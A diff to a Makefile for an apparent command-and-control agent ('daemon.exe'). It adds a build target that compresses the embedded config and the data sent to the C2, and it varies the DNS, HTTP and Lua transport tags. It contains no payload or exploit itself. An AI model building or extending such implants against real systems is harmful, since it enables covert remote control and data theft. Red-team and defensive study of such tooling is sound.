@@ -14,8 +14,15 @@ build:
 # Requires setting EN_DNS to true/false
 withLua:
 	@echo "Building with random ID: $(RAND_NUM) and with Lua support enabled"
-	go build -ldflags "-X main.dnsConfStr=$(EN_DNS) -X main.CompUUID=$(RAND_NUM) -X main.GetURI=$(GET_ABS_PATH) -X main.PostURI=$(PST_ABS_PATH)" -tags "withLua" ./daemon
+	go build -ldflags "-X main.CompUUID=$(RAND_NUM) -X main.GetURI=$(GET_ABS_PATH) -X main.PostURI=$(PST_ABS_PATH)" -tags "withLua withHttp" ./daemon
 
+# With compression
+# Compresses the config file embedded and compresses data sent to the C2
+withComp:
+	@echo "Building with random ID: $(RAND_NUM) and with data compression"
+	@echo "Running python compression script"
+	python compress_conf.py
+	go build -ldflags " -X main.CompUUID=$(RAND_NUM) -X main.GetURI=$(GET_ABS_PATH) -X main.PostURI=$(PST_ABS_PATH)" -tags "withComp withDns" ./daemon
 # Clean rule to remove the binary
 clean:
 	rm -f daemon.exe
